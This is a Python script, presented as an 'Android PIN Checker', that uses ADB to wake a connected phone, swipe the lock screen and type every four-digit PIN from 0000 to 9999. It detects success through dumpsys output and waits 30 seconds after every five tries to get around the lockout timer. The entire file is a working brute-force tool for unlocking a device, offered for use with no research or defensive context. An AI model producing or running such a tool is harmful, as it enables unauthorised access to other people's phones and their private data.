import os
import time
import sys
import re
from subprocess import run, PIPE, CalledProcessError, STDOUT
from datetime import datetime
try:
    from rich.console import Console
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.panel import Panel
    from rich.text import Text
    from rich import print as rprint
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("Installing required packages for better display...")
    run([sys.executable, "-m", "pip", "install", "rich"], stdout=PIPE, stderr=PIPE)
    print("Please restart the script for best experience.")
    sys.exit(1)

# Initialize Rich console
console = Console()

class PINChecker:
    def __init__(self):
        self.console = Console()
        self.start_time = None
        self.attempts = 0
        self.width = 1080
        self.height = 2400
        self.debug_mode = True  # Enable debug mode

    def debug(self, message):
        """Print debug messages if debug mode is enabled"""
        if self.debug_mode:
            self.log(f"[DEBUG] {message}", style="cyan")

    def log(self, message, style=""):
        """Log a message with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.print(f"[dim]{timestamp}[/dim] {message}", style=style)

    def run_command(self, command, check_output=False):
        """Run a command and handle errors"""
        try:
            self.debug(f"Running command: {' '.join(command)}")
            if check_output:
                result = run(command, stdout=PIPE, stderr=STDOUT, text=True)
                self.debug(f"Command output: {result.stdout}")
                return result
            else:
                run(command, check=True, stdout=PIPE, stderr=PIPE)
                return True
        except CalledProcessError as e:
            self.log(f"Command failed: {' '.join(command)}", style="red")
            self.log(f"Error output: {e.stderr.decode() if e.stderr else e.stdout.decode()}", style="red")
            return False

    def check_adb_installed(self):
        try:
            self.debug("Checking if ADB is installed...")
            # Try running adb version instead of which
            result = self.run_command(['adb', 'version'], check_output=True)
            if result and result.returncode == 0:
                self.log("ADB is installed and working", style="green")
                return True
            return False
        except Exception as e:
            self.log(f"Error checking ADB: {str(e)}", style="red")
            return False

    def check_device_connected(self):
        try:
            self.debug("Checking for connected devices...")
            result = self.run_command(['adb', 'devices'], check_output=True)
            if not result:
                return False
            
            devices = result.stdout.strip().split('\n')
            # Filter out empty lines and the "List of devices attached" header
            devices = [d for d in devices if d and not d.startswith('List')]
            
            if devices:
                self.log(f"Found {len(devices)} connected device(s)", style="green")
                for device in devices:
                    self.log(f"Device: {device}", style="green")
                return True
            else:
                self.log("No devices found", style="yellow")
                return False
        except Exception as e:
            self.log(f"Error checking devices: {str(e)}", style="red")
            return False

    def get_screen_size(self):
        try:
            self.debug("Getting screen size...")
            result = self.run_command(['adb', 'shell', 'wm', 'size'], check_output=True)
            if not result:
                return self.width, self.height
            
            match = re.search(r'Physical size: (\d+)x(\d+)', result.stdout)
            if match:
                self.width = int(match.group(1))
                self.height = int(match.group(2))
                self.log(f"Detected screen size: {self.width}x{self.height}", style="blue")
            else:
                self.log("Could not parse screen size, using default", style="yellow")
            return self.width, self.height
        except Exception as e:
            self.log(f"Error getting screen size: {str(e)}", style="red")
            return self.width, self.height

    def initial_unlock(self):
        """Perform initial screen wake and unlock swipe."""
        try:
            width, height = self.get_screen_size()
            
            # Calculate swipe coordinates
            start_x = width // 2
            start_y = int(height * 0.8)
            end_x = width // 2
            end_y = int(height * 0.2)
            
            with console.status("[bold blue]Performing initial unlock sequence...", spinner="dots"):
                # Wake up device
                run(['adb', 'shell', 'input', 'keyevent', '26'], check=True)
                time.sleep(1)
                
                # Swipe gestures
                run(['adb', 'shell', 'input', 'swipe', 
                    str(start_x), str(start_y), str(end_x), str(end_y), '100'], check=True)
                time.sleep(1)
                run(['adb', 'shell', 'input', 'swipe', 
                    str(start_x), str(start_y), str(end_x), str(end_y), '100'], check=True)
                time.sleep(1)

            self.log("Initial unlock sequence completed", style="green")
            return True
        except CalledProcessError as e:
            self.log(f"Error during initial unlock: {e}", style="red")
            return False

    def enter_pin(self, pin):
        try:
            for digit in pin:
                keycode = str(int(digit) + 7)
                run(['adb', 'shell', 'input', 'keyevent', keycode], check=True)
                time.sleep(0.1)
            run(['adb', 'shell', 'input', 'keyevent', '66'], check=True)
            time.sleep(0.5)
            return True
        except CalledProcessError as e:
            self.log(f"Error entering PIN: {e}", style="red")
            return False

    def check_if_unlocked(self):
        try:
            result = run(['adb', 'shell', 'dumpsys', 'window'], stdout=PIPE, stderr=PIPE, text=True)
            return 'mDreamingLockscreen=false' in result.stdout
        except CalledProcessError:
            return False

    def setup_checks(self):
        """Perform all initial setup checks with better error handling"""
        self.log("Starting initial checks...", style="blue")
        
        try:
            # Check if running as root
            if os.geteuid() == 0:
                self.console.print(Panel.fit(
                    "[yellow]Warning: Running this script as root is not recommended![/yellow]"
                ))
                choice = input("Continue anyway? (y/N): ")
                if choice.lower() != 'y':
                    self.log("Exiting due to root user", style="yellow")
                    sys.exit(1)

            # Check ADB installation
            if not self.check_adb_installed():
                self.console.print(Panel.fit(
                    "[red]Error: ADB is not installed or not working[/red]\n\n"
                    "Please install using one of these commands:\n"
                    "[blue]sudo apt install adb[/blue]    # For Debian/Ubuntu\n"
                    "[blue]sudo pacman -S android-tools[/blue]    # For Arch Linux\n"
                    "[blue]sudo dnf install android-tools[/blue]    # For Fedora"
                ))
                sys.exit(1)

            # Check device connection
            if not self.check_device_connected():
                self.console.print(Panel.fit(
                    "[red]No Android device connected![/red]\n\n"
                    "Please ensure:\n"
                    "1. Connect your device via USB\n"
                    "2. Enable USB debugging in Developer options\n"
                    "3. Accept the USB debugging prompt on your device\n"
                    "4. Run 'adb devices' to verify connection"
                ))
                sys.exit(1)

            # Try to get screen size
            self.get_screen_size()
            
            self.log("All initial checks completed successfully!", style="green")
            return True

        except Exception as e:
            self.log(f"Unexpected error during setup: {str(e)}", style="red")
            return False

    def wait_with_countdown(self, seconds):
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
        ) as progress:
            task = progress.add_task(f"Waiting for timeout...", total=seconds)
            for _ in range(seconds):
                time.sleep(1)
                progress.update(task, advance=1)

    def check_all_pins(self):
        if not self.check_device_connected():
            self.console.print(Panel.fit(
                "[red]No Android device connected![/red]\n\n"
                "Please ensure:\n"
                "1. Connect your device via USB\n"
                "2. Enable USB debugging in Developer options\n"
                "3. Accept the USB debugging prompt on your device\n"
                "4. Run 'adb devices' to verify connection"
            ))
            return

        self.start_time = datetime.now()
        
        if not self.initial_unlock():
            self.log("Failed to perform initial unlock sequence", style="red")
            return

        total_pins = 10000
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
        ) as progress:
            task = progress.add_task("Testing PINs...", total=total_pins)
            
            for pin in range(total_pins):
                formatted_pin = str(pin).zfill(4)
                progress.update(task, description=f"Testing PIN: {formatted_pin}")
                
                if not self.enter_pin(formatted_pin):
                    self.log(f"Failed to enter PIN: {formatted_pin}", style="red")
                    time.sleep(1)
                    continue
                
                self.attempts += 1

                if self.check_if_unlocked():
                    elapsed_time = datetime.now() - self.start_time
                    self.console.print(Panel.fit(
                        f"[green]SUCCESS! PIN found: {formatted_pin}[/green]\n"
                        f"Time elapsed: {elapsed_time}\n"
                        f"Total attempts: {self.attempts}"
                    ))
                    return formatted_pin
                
                if self.attempts % 5 == 0:
                    self.log(f"Pausing after {self.attempts} attempts...", style="yellow")
                    self.wait_with_countdown(30)
                
                progress.update(task, advance=1)
        
        elapsed_time = datetime.now() - self.start_time
        self.console.print(Panel.fit(
            "[red]PIN check completed - No matching PIN found[/red]\n"
            f"Time elapsed: {elapsed_time}\n"
            f"Total attempts: {self.attempts}"
        ))

def main():
    try:
        console.clear()
        console.print(Panel.fit(
            "[bold blue]Android PIN Checker[/bold blue] [dim](Professional Edition)[/dim]\n"
            "[dim]===============================================[/dim]"
        ))
        
        checker = PINChecker()
        
        # Show initial instructions
        console.print(Panel.fit(
            "[yellow]Please ensure:[/yellow]\n\n"
            "1. USB debugging is enabled on your phone\n"
            "2. Phone is connected via USB\n"
            "3. ADB is authorized on your phone\n\n"
            "[blue]To enable USB debugging:[/blue]\n"
            "1. Go to Settings > About phone\n"
            "2. Tap Build number 7 times\n"
            "3. Go to Settings > Developer options\n"
            "4. Enable USB debugging"
        ))
        
        input("\nPress Enter when ready...")
        
        # Run setup checks with error handling
        if not checker.setup_checks():
            console.print(Panel.fit(
                "[red]Setup checks failed. Please fix the issues and try again.[/red]"
            ))
            sys.exit(1)
        
        checker.check_all_pins()

    except KeyboardInterrupt:
        console.print("\n[yellow]Script interrupted by user. Exiting...[/yellow]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]Unexpected error: {str(e)}[/red]")
        sys.exit(1)

if __name__ == "__main__":
    main() 